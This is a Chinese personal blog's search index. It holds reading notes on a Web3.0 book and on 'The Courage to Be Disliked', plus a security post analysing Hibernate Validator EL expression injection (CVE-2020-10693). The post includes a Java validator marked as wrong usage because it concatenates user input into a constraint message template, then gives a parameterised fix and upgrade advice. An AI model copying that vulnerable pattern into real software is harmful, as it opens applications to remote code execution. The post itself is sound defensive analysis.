a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"2、元宇宙里的五种角色 内容方：生产优质内容 搭建方：捏各种建筑 硬件方：更好的硬件设备才能有更良好的体验 基础建设方：通信技术、区块链技术 综合服务经纪人：中介，帮助别人在元宇宙里搭建的诉求 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:4:2","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"五、DAO DAO，读作dào。DAO是某公司或实体组织的一种去中心化形式，即去中心化自治组织（Decentralized Autonomous Organization）。DAO更像一个成员自发组建的、公开透明的社区，社区参与者拥有共同的目标，每位成员均有权参与组织的任何决策，成员共同决定组织的发展方向，社区贡献者可以获得对等的激励。 去中心化。DAO组织形式是去中心化、扁平化的，具体体现为在DAO中不存在权力等级划分，也不存在权力中心，在管理上是自下而上的。 自主性与自动化。在DAO中，每位成员都有权利通过投票来参与组织的治理和决策，区块链技术通过智能合约确保了DAO的“代码即法律”（code is law）， 可治理。DAO通常是为了完成某一共同目标而设立的。DAO的成员对在完成统一目标的路径上需要做出的各种决策具有投票权，并通过参与投票完成组织的自治。 公开透明。基于智能合约，终极形态的DAO的管理和运营规则、职责权利、利益分配、奖惩机制等均以智能合约的形式编码在区块链上，从而确保了组织运行的公开透明及自主运行。 Token激励。Token是DAO治理过程中的激励手段，也是DAO运转的核心。通过Token，可以将奖励、信息等元素数字化，促进利益、权利等元素融合，从而提高组织的自发性、自主性，实现价值流动。 DAO是以互联网基础协议、区块链技术、人工智能、大数据、物联网等为底层技术支撑，以Token激励和协同治理为治理手段，拥有明确的共同目标，具备高度信任和高度共识、开放平等、去中心化、公开透明、自动化特征的一种全新的组织形式，是数字协作的最佳实践和Web3.0最基本的组织形式。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:5:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"六、意识形态 如果要用一句话来解释Web3.0的本质，就是“Web3.0的本质是生产资料共享”。生产资料是生产过程中需要用到的资源。 比如，代码作为生产必备的信息是生产资料，用户数据如果需要被二次加工产生价值，那么也是生产资料。 再如，公司的员工作为劳动力是一种生产资料，公司限制员工必须与本家公司绑定，不能兼职，离职后不能去与公司有竞争关系的对手公司工作，本质上就是为了垄断劳动力这种生产资料。 传统经济中，占有更多实体生产资料的组织可以获得更多优势，但在共享生产中，实体生产资料存在限制，难以实现公开溯源和贡献映射。 虚拟经济中，许多生产资料以无实体的方式存在，如代码、算法、知识产权和用户数据。区块链技术为共享生产资料创造了可能性。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:6:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"1、分配写入网络底层 可以把Web3.0想象成一个平面，生产资料、分配过程、交易活动都在这个平面中进行。 每个人都有机会参与到分配中：在传统互联网中，用户只能作为付费用户或创作者获取少量的收益，但在Web3.0世界中，每个人都可以成为消费者、劳动者或中间商，从而享受分成。在Web3.0世界，每个人被看作是“公民”，而不再是传统互联网中的“用户”。 公众决议的分配：公众可以通过DAO投票生产决议。当某些规则不适应市场发展的情况时，需要做出修改。如果需要修改规则，就需要有人提出方案，由DAO进行决策是否修改。Web3.0世界的决议越来越多地由公众投票决定。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:6:1","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"2、一些新词和旧词的新定义 （1）共识创造价值 价值是指凝聚在商品中的无差别的人类劳动，由社会必要劳动时间决定。然而，随着社会的发展，人们对价值的理解受到了新观念的冲击。在Web3.0世界中，建立共识是创造价值的一种新方式，例如NFT的价值严重依赖于共识的形成，如果不属于NFT的共识群体就可能无法理解它的价值。 Meme而来的价值 Meme源自于希腊文mimeme，指的是通过互相模仿而在群体中传播的一种文化现象。Web3.0圈内常用“Meme起来了”来表达共识的广泛传播。Dogecoin就是一个Meme的例子，Meme具有广泛共情能力，可以打破文化界限，成为全球现象级的文化现象。 （2）Token 定义 代币、虚拟币：不太严谨但是又经常被圈外使用的非规范性口语表达，这种表达不能够区分Token、Coin、Currency的差别 Token：基于智能合约发出的价值流转载体，代表着信息、数据、资产或某种权限 Coin：不具备合约拓展功能、只具备交易属性的链上价值流通载体，最为大家熟知的例子就是Bitcoin、Dogecoin。 Currency：有货币属性的那些Token或者Coin。比如USDT稳定币 Token分类 是否同质化或可分割（Token是否可以被无限地分割成小于1的单位。比如，0.1个、0.005个等） Fungible Token（同质化Token，FT）是可分割的，并且每一个Token之间没有任何区别 None Fungible Token（NFT）则是不可分割的，并且每个Token都不相同，即使它们的表现形式是一样的，但其实它们也是不同的个体，且可以被赋予不同的功能。 是否原生。 在公链诞生之时起就存在并代表这条公链上某种网络资源、在公链上进行活动需要消耗的Token通常被称为原生Token。比如，ETH之于Etherem，CFX之于Conflux，SOL之于Solana。 非原生Token无法直接用于交换网络资源。非原生Token的一切流转行为也需要花费原生Token作为gas。 是否具备某种实际的功能。 有一些Token虽然非原生的，不能用于支付gas，但是可以用于交换其协议的某种服务，因而也具备了经济价值，这种Token可以被归类为协议（Protocol）Token。比如，使用Chainlink的某些服务就需要花费其协议Token“Link”。 那些不具备实际功能的Token，往往会以治理（Governance）Token的形式存在，通俗地讲就是可以用来投票决定社区事务。 有些Token具备分润功能，比如有的项目会承诺将链外利润的一部分用于购买Token并销毁，从而将项目运营的价值注入Token，各个去中心化交易平台的平台Token往往如此。 还有一种Token其实什么作用都没有，只是为了某种理念而发行，比如ConstitutionDAO发行的People，只要捐钱就可以按比例获得。其神奇之处就在于，虽然这种Token本身并没有为某种功能或者场景而设计，但是某个“路人”却有可能为它设计场景，而其社区理念和共识也映射在其经济价值上并影响其价格。 （3）去中心化金融（DeFi） Decentralized Finance是去中心化金融，通常被缩写为DeFi。DeFi是一种不由任何人控制，基于公链提供的点对点的金融服务。通过DeFi，你可以快速地享受绝大多数的银行服务（例如，借贷、购买保险、理财、衍生品交易、资产交易等）且不需要任何材料证明。得益于密码学和区块链技术，DeFi本身就是点对点、全球化、平等地面向这个世界上所有人的超级“银行”。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:6:2","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"七、产品形态 1、一个成功的项目并不需要百万级的用户或者大量员工 在Web2.0时代，企业需抢占市场、吸引流量，以数据为核心体系来发展自身，追求百万、千万乃至亿级的用户体量作为商业价值的标准；而在Web3.0时代，团队只需要几个人就可以经营市值高达数十亿元的公司、项目不再需要百万级的用户体量就可以有巨大的影响力，甚至可以通过DAO的方式完全退出项目，交由社区来维护运行，大大降低了创业门槛和成本。如Uniswap、NFT项目 2、开发者：解放创新 在Web2.0时代，数据和用户信息被巨头垄断，新的应用难以与已有平台竞争，创新被压制，用户体验受限。而在Web3.0时代，数据是公开的，任何应用或开发者都可以利用这些数据进行应用创新，用户会有更好的体验和更多选择，应用方将迎来公平竞争、开放包容、利他共荣的市场环境。此外，Web3.0时代也能够避免像李跳跳这样的应用因挑战巨头利益而被封杀的情况发生。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:7:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"八、Web3.0时代的个人与群体 DID：DID是Decentralized ID的简写，意思是去中心化的身份识别系统，说得更直白就是可以登录多个平台的去中心化账户，也经常被称为“钱包地址”。与DID相比，ENS提供了人类可读的域名而非用一长串无意义的随机字母和数字作为Web3.0身份的象征。 虚拟化身：虚拟化身作为生物人个体在虚拟世界中的化身存在。与DID、NFT头像相比，虚拟化身更丰富地表现了个体的审美、观点、经济能力、社交地位等多元化特点。虚拟化身的外在特质通常与其操控者相吻合，这与Web3.0玩家在挑选NFT头像时的心理类似。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:8:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"九、名词 TVL：总锁定价值（Total Value Locked，TVL）TVL是加密货币中使用者抵押在其中的数字资产的总价值，经常用来被评估项目的流动性和容量 GAS：网络资源使用费，通常由用户承担，若有代付则不需要用户承担 EVM：以太坊虚拟机（Ethereum Virtual Machine）它是以太坊中运行智能合约的一个虚拟机。 ZKP：零知识证明（Zero-knowledge proof，ZKP）不泄漏任何信息的情况下，证明某个命题的真实性。也就是说，通过零知识证明的方式，证明方不需要向验证方透露任何有关证明的信息，仅通过处理数据得到验证结果。 DeFi：去中心化金融（Decentralized Finance，DeFi），它可以是用智能合约构建的程序，也可以是去中心化应用（DApps），用于提供各种金融服务，例如贷款、汇款、交易等。 DApp：去中心化应用程序（Decentralized Application，DApp）：部署在公链上的App，以加密代币的形式作为激励。 DAO：去中心化自治组织（Decentralized Autonomous Organization，DAO）使用区块链技术构建的组织形式，其中的所有权和治理由智能合约自动执行。 智能合约：智能合约用编程语言将商业规则编码到区块链上，并由网络参与者来执行。 NFT：非同质化通证（Non-Fungible Token，NFT）每一个NFT拥有独特且唯一的标识。 Uniswap：Uniswap是一种基于以太坊的协议，旨在促进ETH和ERC20代币数字资产之间的自动兑换交易，在以太坊上自动提供流动性。Uniswap是目前最大的去中心化交易所。 GameFi：GameFi是指将游戏和DeFi进行结合的新业务模式 交易费用：所有的加密货币交易都包含一小笔交易费用。打包区块的矿工可以获得打包奖励+交易手续费 图灵完备：图灵完备是指一台机器能够进行其他可编程计算机都能执行的运算的能力。以太坊虚拟机（EVM）就是图灵完备的一个例子。 Airdrop（空投）：空投就是项目方免费赠送代币给你 AMA（问我什么都可以）：AMA 是 Ask Me Anything（问我什么都可以）的缩写，一般指公司成员或是个人举行的问答活动，用户、读者、观众可以询问任何相关的问题。常见的 AMA 形式有视频直播、文字直播。 AML（反洗钱）：AML（Anti-Money Laundering）代表反洗钱的政策和相关法律法规，这可以防止非法获得的钱被掩饰及合法化。 FOMO（错失恐惧症）：FOMO 是 Fear of Missing Out（害怕错过）的首字母缩写，特指人的一种害怕错过心理。比如说，最近比特币价格突破了 10,000 美元，很多人会产生害怕错过接下去比特币继续上涨的行情，这种害怕错过的心理称为 FOMO。 KYC（实名认证）：KYC 是 Know Your Customer（了解你的客户）的首字母缩写，指一系列法律法规要求企业了解客户的身份（要求提供身份扫描或其他身份证件） 权益证明：一个分布式共识算法，会根据你所拥有或持有的币的数量来进行收益奖励。你投资的币越多，你以这个协议挖矿赚的就越多。 工作量证明：一个分布式共识算法，需要积极参与挖掘数据块，常消耗资源，比如电力。你做越多‘工作’或你提供越多计算能力，就会奖励你越多币。 混合权益证明/工作量证明：混合权益证明/工作量证明能让权益证明和工作量证明都作为网络上的分布式共识算法。用这种方法的话，矿工和选民（代币持有者）就可能实现平衡，且内部人员（持有者）和外部人员（矿工）可创建一个基于社区的治理体系。 预言机(Oracle)：预言机通过向智能合约提供数据来充当现实世界和区块链间的桥梁。 以太坊虚拟机：以太坊虚拟机(EVM) 是一种图灵完备虚拟机，允许任何人执行任意EVM字节码。每个以太坊节点都在EVM上运行以保持整个区块链的一致性。 点对点(Peer to Peer)：点对点(P2P) 是指双方间或更多是在高度互联的网络里的去中心化交互。P2P网络的参与者可以通过单一中介点与对方直接相互操作。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:9:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"十、读完回顾 Web3.0即是现在也是未来，看得见的手也无法阻止发展前进。 真正的Web3.0是自由、民主、去中心的世界。 引用一句话 “比特币最伟大的时刻就是中本聪消失的时刻” ","date":"2024-03-07","objectID":"/posts/read-web3-book/:10:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"心理学三大巨头：荣格、弗洛伊德、阿德勒 真正的自由就是被別人讨厌 ——阿德勒 （不活在别人的评价中，就会被别人讨厌） ","date":"2024-03-03","objectID":"/posts/read-the-courage-to-be-disliked/:0:0","tags":["心理学"],"title":"阅读 -《被讨厌的勇气》- 岸见一郎，古贺史健","uri":"/posts/read-the-courage-to-be-disliked/"},{"categories":["读书心语"],"content":"一、内容概述 整体来说，这本书到底在谈些什么？ 如何通过实现自我价值和与他人建立良好关系来实现自我解放和幸福。 ","date":"2024-03-03","objectID":"/posts/read-the-courage-to-be-disliked/:1:0","tags":["心理学"],"title":"阅读 -《被讨厌的勇气》- 岸见一郎，古贺史健","uri":"/posts/read-the-courage-to-be-disliked/"},{"categories":["读书心语"],"content":"二、读书笔记 ","date":"2024-03-03","objectID":"/posts/read-the-courage-to-be-disliked/:2:0","tags":["心理学"],"title":"阅读 -《被讨厌的勇气》- 岸见一郎，古贺史健","uri":"/posts/read-the-courage-to-be-disliked/"},{"categories":["读书心语"],"content":"1、目的论（关于心理创伤） 原因论，弗洛伊德，现在的问题是由过去造成的 原因论是错误的，因为人们对于同一段历史的解读，会因为后来的结果不一样而不一样 心理治療目的是，追究你的過去，直到不恐惧 目的论，阿德勒，现在的问题是由目的（潜意识存在的）造成的 ex:例如以前一個人被人打了，結果他現在不敢出門了 原因是因為他不想出門（為什麼不出門，是因為他想要實現一個舒适的狀態） 跟以前沒有關係，心理創傷不存在，過去是不会影响現在 阿德勒的心理治療目的是 建立勇氣（不斷給你鼓勵） ","date":"2024-03-03","objectID":"/posts/read-the-courage-to-be-disliked/:2:1","tags":["心理学"],"title":"阅读 -《被讨厌的勇气》- 岸见一郎，古贺史健","uri":"/posts/read-the-courage-to-be-disliked/"},{"categories":["读书心语"],"content":"2、课题分离 人所有的烦恼都来自于人际关系 烦恼的根源就是和别人比较（你觉得自己穷 是因为你见过富的，你觉得自己不好看 是因为有长的好看的） 解决办法：课题分离 你遇到一個問題首先要把這個問題分成兩個部分，一個是你自己的問題一個是別人的問題，你只需要解決自己的問題，不能干涉他人 ex:你要辞职，你老婆不同意（你要辞职你的問題，老婆不同意他的問題；如果顾及对方感受，那这个问题就解决不了） 人际关系的两大问题（如果需要解决人际关系的问题，就需要把两个区分开） 你介入了他人的问题 他人介入了你的问题 为什么要介入别人的问题呢？（介入他人问题不是为了他人好，而是为了满足自己） 是为了得到一种自我的心里满足，通过影响他人，实现自己的控制欲 通过他人的认可，来满足自我的心理需求 你要是征求对方意见就是转嫁责任，以后可能成为内心心结。 你没辞职，你一辈子都会记住这个事情 如果你老婆妥協，但結果老公沒有成功 重點：所以永遠都不要強調，我為你xxx，也不要強調你能不能也為我xxx；并不是自私，阿德勒希望每一個人內心能夠強大起來不依賴任何人；不指望其他人对我负责，我也不能替别人着想（不能设身处地为他人着想，因为你并不是他；我为你付出这么多，在另一个人看来就是压力） 不表扬：表扬是一种干涉，表扬是一种洗脑（二级洗脑，潜意识） 被表扬潜意识会形成：我努力的目的是为了得到表扬，而不是真正为了感兴趣而努力。造成他认为自己存在的价值是为了得到他人的肯定，而不是自己本身 ","date":"2024-03-03","objectID":"/posts/read-the-courage-to-be-disliked/:2:2","tags":["心理学"],"title":"阅读 -《被讨厌的勇气》- 岸见一郎，古贺史健","uri":"/posts/read-the-courage-to-be-disliked/"},{"categories":["读书心语"],"content":"3、共同体感觉 內心希望能夠成為群體當中重要的部分 不要追求他人的认可，要追求共同体感觉 价值：不是通过别人认可，而是通过集体贡献而获得 阿德勒認為不應該和任何人競爭（竞争是一种没有自信的表现） 如果通过别人比较，或通过别人认可来体现自我价值，那你存在就没有意义 共同体感觉和他人认可的区别 他人认可：他人不存在的时候你就不会行动（为了别人而活） 共同体感觉：做的这件事是为了大家共同好（为了自己而活） 做到这三步，被他人认可的需求就不存在了 自我接纳 你要完全接受自己的存在 他者信赖 無條件信賴他人，你不相信他人別人也不會相信你 他者贡献 為共同體做出貢獻 你要為整個整體做出貢獻 ","date":"2024-03-03","objectID":"/posts/read-the-courage-to-be-disliked/:2:3","tags":["心理学"],"title":"阅读 -《被讨厌的勇气》- 岸见一郎，古贺史健","uri":"/posts/read-the-courage-to-be-disliked/"},{"categories":["读书心语"],"content":"三、经典语录 再怎么找原因也没法改变一个人 如果我们一直依赖原因论，就会永远止步不前 决定我们自身的不是过去的经历，而是我们自己赋予经历的意义 服务员把咖啡撒到了我衣服上，我大发雷霆 为了大发雷霆而制造怒气；为了震慑服务员作为相应手段捏造了愤怒感情 重要的不是被给予了什么，而是如何去利用被给予的东西 因为矮而变得和蔼可亲 现在的你之所以不幸正式因为你自己亲手选择了不幸 表扬这种行为含有有能力者对没能力者所做的评价这方面的特点 对人而言，最大的不幸就是不喜欢自己 人生的意义是自己赋予自己的 ","date":"2024-03-03","objectID":"/posts/read-the-courage-to-be-disliked/:3:0","tags":["心理学"],"title":"阅读 -《被讨厌的勇气》- 岸见一郎，古贺史健","uri":"/posts/read-the-courage-to-be-disliked/"},{"categories":["读书心语"],"content":"四、读完回顾 做好自己，不在意别人的评价，不要怕被讨厌，这样才会自由。 第一个束缚来自过去。重要的不是过去，而是你怎么看待过去，而我们对过去的看法，是可以改变的。 第二个束缚来自人际关系。理想的人际关系大概是“我爱你，但与你无关”。他认为每个人的课题都是分离又独特的。我怎么爱你，这是我的课题，而你要不要接受我的爱，这是你的课题。每个人都守自己的本分，过自己的人生，人和人之间就没那么多纠结和烦恼。 第三个束缚，来自未来。当你急着奔向未来的时候，说明你已经不喜欢现在了。阿德勒的哲学同样强调当下的意义，人生是连续的刹那，此时此刻才是生活的真谛。 阿德勒的心理学，就这样把自我从过去、人际关系和未来中解放出来，把人生责任和选择的权力交给了我们自己。当我们从这些束缚中解脱出来后，就会发现，我们其实一直都很自由，真正让我们裹足不前的，原来正是我们自己。 ","date":"2024-03-03","objectID":"/posts/read-the-courage-to-be-disliked/:4:0","tags":["心理学"],"title":"阅读 -《被讨厌的勇气》- 岸见一郎，古贺史健","uri":"/posts/read-the-courage-to-be-disliked/"},{"categories":["网络安全"],"content":"一、漏洞分析 官方给出的漏洞，版本1：https://mvnrepository.com/artifact/org.hibernate.validator/hibernate-validator imgs 未提有漏洞，实测存在漏洞，版本2（不做参考）： https://mvnrepository.com/artifact/org.hibernate/hibernate-validator img 6.1.4及以下版本指向同一漏洞编号，CVE-2020-10693（EL表达式注入） img 实际测试，使用无漏洞版本6.1.*最高版本(6.1.7)进行测试，依然能rce img debug跟踪，关键代码如下 /org/hibernate/validator/hibernate-validator/6.1.7.Final/hibernate-validator-6.1.7.Final.jar!/org/hibernate/validator/messageinterpolation/AbstractMessageInterpolator.class 分为三步： 从参数中拿出message 判断是否有{，解析要执行的参数 执行el表达式 img img 以下是执行时过程代码，可忽略 /org/hibernate/validator/hibernate-validator/6.1.7.Final/hibernate-validator-6.1.7.Final.jar!/org/hibernate/validator/messageinterpolation/ResourceBundleMessageInterpolator.class img /org/hibernate/validator/hibernate-validator/6.1.7.Final/hibernate-validator-6.1.7.Final.jar!/org/hibernate/validator/internal/engine/messageinterpolation/InterpolationTerm.class img /org/hibernate/validator/hibernate-validator/6.1.7.Final/hibernate-validator-6.1.7.Final.jar!/org/hibernate/validator/internal/engine/messageinterpolation/ElTermResolver.class img 结论：官方在6.1.7.Final中并未处理EL表达式拼接，也未在公告中说明这个版本存在问题（他说没漏洞实际有漏洞，作为特性个人认为官方不认漏洞，但在大版本6.2.0修复了缺陷） ","date":"2022-10-01","objectID":"/posts/hibernate-validate-el-injection/:1:0","tags":["漏洞研究","EL表达式注入"],"title":" hibernate validate EL表达式注入漏洞","uri":"/posts/hibernate-validate-el-injection/"},{"categories":["网络安全"],"content":"二、未受影响版本 实际测试6.2.0.Final，一二步没有任何变化 /org/hibernate/validator/hibernate-validator/6.2.0.Final/hibernate-validator-6.2.0.Final.jar!/org/hibernate/validator/messageinterpolation/AbstractMessageInterpolator.class img 第三步判断了EL表达式语言引擎启用的功能级别，NONE不执行EL表达式（默认为NONE） img Hibernate Validator 6.2.0.Final 开始提供了EL表达式几个功能级别，可以通过ExpressionLanguageFeatureLevel枚举： NONE 表达式语言内插完全禁用。 VARIABLES 允许通过addExpressionVariable()的资源包和使用formatter对象。 BEAN_PROPERTIES 允许一切VARIABLES允许加上bean属性的插值。 BEAN_METHODS 还允许执行bean方法。 /org/hibernate/validator/hibernate-validator/6.2.0.Final/hibernate-validator-6.2.0.Final.jar!/org/hibernate/validator/internal/engine/constraintvalidation/ConstraintValidatorContextImpl.class img ","date":"2022-10-01","objectID":"/posts/hibernate-validate-el-injection/:2:0","tags":["漏洞研究","EL表达式注入"],"title":" hibernate validate EL表达式注入漏洞","uri":"/posts/hibernate-validate-el-injection/"},{"categories":["网络安全"],"content":"三、官方修复方案 错误用法示例（关键代码14行）： public class MonthValidatorProcess implements ConstraintValidator\u003cMonthValidator, String\u003e { public static final DateTimeFormatter YEAR_MONTH_DATE_FORMATTER = DateTimeFormatter.ofPattern(\"yyyyMMdd\"); @Override public boolean isValid(String yearMonth, ConstraintValidatorContext constraintValidatorContext) { if (StringUtils.isBlank(yearMonth)) { return false; } try { String yearMonthDay = yearMonth + \"01\"; LocalDate.parse(yearMonthDay, YEAR_MONTH_DATE_FORMATTER); return true; } catch (Throwable e) { constraintValidatorContext.disableDefaultConstraintViolation(); constraintValidatorContext.buildConstraintViolationWithTemplate(String.format(\"日期[%s]不合法\", yearMonth)) // String字符串直接拼接到buildConstraintViolationWithTemplate .addConstraintViolation(); return false; } } } ","date":"2022-10-01","objectID":"/posts/hibernate-validate-el-injection/:3:0","tags":["漏洞研究","EL表达式注入"],"title":" hibernate validate EL表达式注入漏洞","uri":"/posts/hibernate-validate-el-injection/"},{"categories":["网络安全"],"content":"1、使用参数化的消息模板 正确用法示例（关键代码15行） public class MonthValidatorProcess implements ConstraintValidator\u003cMonthValidator, String\u003e { public static final DateTimeFormatter YEAR_MONTH_DATE_FORMATTER = DateTimeFormatter.ofPattern(\"yyyyMMdd\"); @Override public boolean isValid(String yearMonth, ConstraintValidatorContext constraintValidatorContext) { if (StringUtils.isBlank(yearMonth)) { return false; } try { String yearMonthDay = yearMonth + \"01\"; LocalDate.parse(yearMonthDay, YEAR_MONTH_DATE_FORMATTER); return true; } catch (Throwable e) { HibernateConstraintValidatorContext hcontext = constraintValidatorContext.unwrap(HibernateConstraintValidatorContext.class); hcontext.disableDefaultConstraintViolation(); hcontext.addExpressionVariable(\"validatedValue\",yearMonth).buildConstraintViolationWithTemplate(\"日期${validatedValue}不合法\") // 使用addExpressionVariable参数绑定 .addConstraintViolation(); return false; } } } ","date":"2022-10-01","objectID":"/posts/hibernate-validate-el-injection/:3:1","tags":["漏洞研究","EL表达式注入"],"title":" hibernate validate EL表达式注入漏洞","uri":"/posts/hibernate-validate-el-injection/"},{"categories":["网络安全"],"content":"2、升级hibernate-validator版本 升级hibernate-validator大于等于6.2.0.final（官方在大于等于6.2.0.final中判断了EL表达式语言引擎启用的功能级别，默认级别不执行EL表达式） 注：7.0.0及以上版本存在较大变更，虽然不存在漏洞，但很多方法都变了，需要重新写hibernate ","date":"2022-10-01","objectID":"/posts/hibernate-validate-el-injection/:3:2","tags":["漏洞研究","EL表达式注入"],"title":" hibernate validate EL表达式注入漏洞","uri":"/posts/hibernate-validate-el-injection/"},{"categories":null,"content":"关于 5ky","date":"2019-08-02","objectID":"/about/","tags":null,"title":"关于 5ky","uri":"/about/"},{"categories":null,"content":"  Author：Ty  Channel：5ky公告  E-Mail：emonbao@gmail.com ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"关于 5ky","uri":"/about/"},{"categories":null,"content":"个人简介  网络安全从业者 ","date":"2019-08-02","objectID":"/about/:0:1","tags":null,"title":"关于 5ky","uri":"/about/"},{"categories":null,"content":"正在学习  Coding… ","date":"2019-08-02","objectID":"/about/:0:2","tags":null,"title":"关于 5ky","uri":"/about/"}]